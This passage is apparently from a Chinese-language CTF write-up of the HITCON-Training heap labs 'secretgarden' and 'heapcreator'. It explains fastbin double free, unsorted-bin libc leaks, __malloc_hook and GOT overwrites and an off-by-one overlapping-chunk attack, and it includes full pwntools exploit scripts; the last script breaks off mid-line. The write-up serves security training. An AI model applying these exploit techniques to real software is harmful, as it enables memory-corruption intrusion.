&lt;malloc@got.plt+2&gt;:\t0xee7000007fd565d4\t0x603000007fd565d2</span><br><span class=\"line\">0x60207a &lt;open@got.plt+2&gt;:\t0x5e8000007fd565db\t0xa4d000007fd565cf</span><br><span class=\"line\">0x60208a &lt;__isoc99_scanf@got.plt+2&gt;:\t0x088600007fd565d2\t0x0000000000000040</span><br><span class=\"line\">0x60209a:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x6020aa:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x6020ba:\t0x4620000000000000\t0x000000007fd56608</span><br><span class=\"line\">0x6020ca:\t0x0000000000030000\t0x0000000000000000</span><br><span class=\"line\">0x6020da:\t0x4010000000000000\t0x507000000000017f</span><br><span class=\"line\">0x6020ea &lt;flowerlist+10&gt;:\t0x50c000000000017f\t0x000000000000017f</span><br></pre></td></tr></table></figure>\n<p>由fastbin数组索引计算的宏定义可知，高四位不影响size的大小。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define fastbin_index(sz) \\</span><br><span class=\"line\">\t((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure>\n<p>在分配到该位置后，复写got表即可实现利用，exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name, color)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.sendline(color)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"garden:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clean</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x400c7b</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"a\"</span>, <span class=\"string\">\"aaaa\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"b\"</span>, <span class=\"string\">\"bbbb\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"c\"</span>, <span class=\"string\">\"cccc\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1-&gt;2-&gt;1</span></span><br><span class=\"line\">del_(<span class=\"number\">1</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = <span class=\"number\">0x601ffa</span></span><br><span class=\"line\">freegot = elf.got[<span class=\"string\">'free'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, p64(addr), <span class=\"string\">\"fake\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"d\"</span>, <span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"e\"</span>, <span class=\"string\">\"eeee\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">\"a\"</span>*<span class=\"number\">6</span> + p64(<span class=\"number\">0</span>) + p64(magic) * <span class=\"number\">2</span> ,<span class=\"string\">\"red\"</span>) <span class=\"comment\">#malloc in fake_chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"提高-1\"><a href=\"#提高-1\" class=\"headerlink\" title=\"提高\"></a>提高</h3><h4 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>leak libc最简单的方法之一，就是使用unsorted bin攻击，将free后的unsorted bin，直接malloc，这不会改变其中泄漏出的libc地址。通过overlapping，或者修改inuse等辅助变量，也都可能实现leak libc。这里我们使用unsorted bin攻击直接leak libc。</p>\n<h4 id=\"劫持控制流\"><a href=\"#劫持控制流\" class=\"headerlink\" title=\"劫持控制流\"></a>劫持控制流</h4><p>我们通过复写<code>__malloc_hook</code>的got表即可实现利用，在libc上，<code>__malloc_hook</code>紧挨着main_arena（已经leak得到main_arena+0x88的地址）。我们仍然通过上述调整偏移的方法，寻找某个<code>__malloc_hook</code>之前合法的地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x7fdaa8a46af0 + 5 - 0x8</span><br><span class=\"line\">0x7fdaa8a46aed &lt;_IO_wide_data_0+301&gt;:\t0xdaa8a45260000000\t0x000000000000007f</span><br><span class=\"line\">0x7fdaa8a46afd:\t0xdaa8707e20000000\t0xdaa8707a0000007f</span><br><span class=\"line\">0x7fdaa8a46b0d &lt;__realloc_hook+5&gt;:\t0x000000000000007f\t0x0000000000000000</span><br><span class=\"line\">0x7fdaa8a46b1d:\t0x0000000000000000\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>可以看到，当分配到如下地址时，size正好为0x7f，即malloc(0x60)的chunk，然后我们将<code>__malloc_hook</code>覆盖为one_gadget即可。</p>\n<h4 id=\"触发-malloc-hook\"><a href=\"#触发-malloc-hook\" class=\"headerlink\" title=\"触发__malloc_hook\"></a>触发__malloc_hook</h4><p>这里如果我们直接调用add功能，而在malloc(0x28)时触发malloc_hook，会发现所有的one_gadget地址都不符合要求。这里我们有一个小trick，如果我们对同一个chunk free两次，触发对double free的报错，这时libc代码也会触发_malloc_hook。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 两次free同一个chunk，触发报错函数</span></span><br><span class=\"line\"><span class=\"comment\">// 而调用报错函数的时候又会用到malloc-hook，从而getshell</span></span><br><span class=\"line\"><span class=\"comment\">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class=\"line\"><span class=\"comment\">       record we are going to add (i.e., double free).  */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__builtin_expect (old == p, <span class=\"number\">0</span>))</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        errstr = <span class=\"string\">\"double free or corruption (fasttop)\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> errout;</span><br><span class=\"line\">\t\t\t&#125;</span><br></pre></td></tr></table></figure>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name, color)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.sendline(color)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"garden:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clean</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">\"a\"</span>,<span class=\"string\">\"aaaa\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">\"b\"</span>,<span class=\"string\">\"bbbb\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">del_(<span class=\"number\">0</span>)</span><br><span class=\"line\">clean()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">\"c\"</span>,<span class=\"string\">\"cccc\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">visit()</span><br><span class=\"line\">libc_addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">offset = <span class=\"number\">0x3c4b63</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = libc_addr - offset</span><br><span class=\"line\"></span><br><span class=\"line\">malloc_hook = libc.symbols[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">addr = <span class=\"number\">0x3c4aed</span> + libc.address</span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf02a4</span> + libc.address</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"a\"</span>, <span class=\"string\">\"aaaa\"</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"b\"</span>, <span class=\"string\">\"bbbb\"</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">3</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, p64(addr), <span class=\"string\">\"fake\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"c\"</span>, <span class=\"string\">\"cccc\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"d\"</span>, <span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"number\">0x13</span> * <span class=\"string\">\"e\"</span> + p64(one_gadget),<span class=\"string\">\"asdf\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab13——heapcreator\"><a href=\"#Lab13——heapcreator\" class=\"headerlink\" title=\"Lab13——heapcreator\"></a>Lab13——heapcreator</h2><h3 id=\"防护-3\"><a href=\"#防护-3\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab13$ checksec heapcreator</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab13/heapcreator&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题也是标准的堆题，功能有增删改查。</p>\n<h4 id=\"create\"><a href=\"#create\" class=\"headerlink\" title=\"create\"></a>create</h4><p>首先malloc(0x10)的chunk，存储在全局指针数组heaparray上。chunk中记录指向内容的指针和输入的size，</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">chunk</span>&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> size; <span class=\"comment\">// 0x0</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *content; <span class=\"comment\">// 0x8</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"edit\"><a href=\"#edit\" class=\"headerlink\" title=\"edit\"></a>edit</h4><p>该功能内存在漏洞，在写入的时候会多写入一位，所以存在off_by_one write漏洞。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">edit_heap</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>LL);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( heaparray[v1] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content of heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read_input(*((<span class=\"keyword\">void</span> **)heaparray[v1] + <span class=\"number\">1</span>), *(_QWORD *)heaparray[v1] + <span class=\"number\">1L</span>L);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No such heap !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"show\"><a href=\"#show\" class=\"headerlink\" title=\"show\"></a>show</h4><p>输出size和content的内容。</p>\n<h4 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h4><p>依次free掉content和chunk两个堆块，然后将heaparray全局数组上对应项置为NULL，所以不存在UAF漏洞。</p>\n<h3 id=\"利用-3\"><a href=\"#利用-3\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>​    我们要利用off-by-one写漏洞，实现前向的overlapping，具体方法是，首先申请两个size分别为0x18和0x10的chunk，使得size为0x18的chunk复用下一个chunk的prev_size字段；然后用edit功能修改下个chunk的size字段为\\x41（或\\x40）都可以，此时调用delete功能，就会向fastbin数组中0x20和0x40的单向链表中分别放入一个chunk，其中0x40的chunk与0x20的chunk形成了重叠，之后的利用就顺理成章了，我们看一下exp。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./heapcreator\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./heapcreator\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap:\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap : \"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x18</span>, <span class=\"string\">\"a\"</span>) <span class=\"comment\"># 0 </span></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"b\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># change size</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>, <span class=\"string\">\"a\"</span> * <span class=\"number\">0x18</span> + <span class=\"string\">\"\\x41\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># push to fastbin</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + <span class=\"string\">\"\\x21\"</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>) + p64(<span class=\"number\">0x30</span>) + p64(atoi_got)</span><br><span class=\"line\"><span class=\"comment\"># use overlapping </span></span><br><span class=\"line\">create(<span class=\"number\">0x30</span>, payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak</span></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span 